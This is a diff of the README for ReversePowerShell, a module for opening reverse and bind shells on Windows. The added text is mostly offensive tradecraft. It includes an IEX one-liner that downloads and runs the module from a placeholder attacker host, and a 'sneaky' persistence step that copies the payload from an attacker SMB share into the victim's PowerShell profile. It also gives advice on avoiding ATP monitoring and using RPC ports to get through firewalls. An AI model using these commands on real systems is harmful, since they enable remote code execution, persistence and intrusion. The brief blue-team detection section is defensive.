@@ -1,12 +1,13 @@
 # ReversePowerShell
 Functions that can be used to gain Reverse Shells with PowerShell. Invoke-ReversePowerShell function can be used
 to connect to Start-Listener as well as netcat and metasploit modules however it can not connect to Start-Bind.
-I will add a tool for that in the future.
+I will add a tool for that in the future. This is a PowerShell module meaning it only contains functions/cmdlets to be imported into a PowerShell session. If you wish to execute one of the commands whenever the file is run just add the command you wish to execute to the bottom of the file.
 
 #### BLUE TEAM DISCOVERY
 Find-ReverseShell.psm1 can be used to search the Windows Event Log for when a Reverse Shell is created that uses a System.Net.Sockets.TcpListener object. This will discover any reverse shell that creates a TcpListener object and not just the below module. This method does not catch PowerCat.ps1 which I am still looking for a good way to discover. This part is still a work in progress.
 
-#### INSTALL THE MODULE
+#### WAYS TO INSTALL OR IMPORT THE MODULE
+This is not a requirement. It just a way of saving the module to your device if you wish to keep it around for use at later times.
 Install this module by placing the cloned folder "ReversePowerShell" inside the following directory location.
  "$env:USERPROFILE\\WindowsPowerShell\\Modules\\ReversePowerShell"
  For PowerShell Core v6 the location of this module will need to be
@@ -17,8 +18,35 @@ Once there it can be imported into a PowerShell session using the following comm
 Import-Module ReversePowerShell
 ```
 
-
+If your are able to use Invoke-Expresion (IEX) this module can be imported using the following command.
 You can also copy and paste the functions into your PowerShell session so the cmdlets become available to run.
+```powershell
+IEX (New-Object -TypeName Net.WebClient).downloadString("http://<attacker ipv4>/ReversePowerShell.psm1")
+```
+
+IEX is blocked from users in most cases and Import-Module is monitored by things such as ATP. Downloading files to a targerts machine is not always allowed in a penetration test. Another method to use is Invoke-Command. This can be done using the following format.
+```powershell
+Invoke-Command -ComputerName <target device> -FilePath .'\ReversePowerShell.ps1m' -Credential (Get-Credential)
+```
+This will execute the file and it's contents on the remote computer. 
+
+Another sneaky method would be to have the function load at the start of a new PowerShell window. This can be done by editing the $PROFILE file.
+```powershell
+Write-Verbose "Creates powershell profile for user"
+New-Item -Path $PROFILE -ItemType File -Force
+#
+# The $PROFILE VARIABLE IS EITHER GOING TO BE 
+#    - C:\Users\<username>\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1
+# OR
+#    - C:\Users\<username>\OneDrive\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1
+#
+# Write-Verbose "Turning this module into the PowerShell profile will import all of the commands everytime the executing user opens a PowerShell session. This means you will need to open a new powershell session after doing this in order to access the commands. I assume this can be done by just executing the "powershell" command though you may need to have a new window opened or new reverse/bind shell opened. You can also just reload the profile
+cmd /c 'copy \\<attacker ip>\MyShare\ReversePowerShell.ps1 $env:USERPROFILE\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.psm1
+
+powershell.exe
+# If that does not work try reloading the user profile.
+& $PROFILE
+```
 
 #### START BIND SHELL
 The below command can be executed to start a bind shell that connects the defined port to PowerShell.
@@ -43,12 +71,18 @@ port 8089. This will not be able to complete a connection to the Start-Bind cmdl
 Invoke-ReversePowerShell -IpAddress 192.168.0.10 -Port 8089
 ```
 ---
-#### FIREWALL
-If you are not able to gain a connection it is most likely due to the Windows Firewall.
-The following commands can be used to view firewall rules. If one of these does not work
+#### FIREWALL AND BLOCKED PORTS
+If you are not able to gain a connection it is most likely due to the Windows Firewall. If you have access on a machine as a user you will not be able to make firewall changes. You need admin priviledges for that. Use the high range ports RPC would connect to or other common port. If a range has been defined you can find the allowed ports at "HKLM:\Software\Microsoft\Rpc\Internet\ with Entry name Data Type". Otherwise when not defined any ports between 49152-65535 might work.
+This command may also display the port allowed RPC port range
+```cmd
+netsh int ipv4 show dynamicport tcp 
+```
+
+The following commands can be used to view firewall rules. If one of these does not work.
 the other might.
 ```powershell
-$FirewallRule = New-object -ComObject HNetCfg.FwPolicy2
+# This way should work to display the firewall even if you are a user
+$FirewallRule = New-Object -ComObject HNetCfg.FwPolicy2
 $FirewallRule.Rules | Select-Object -Property *
 
 # OR
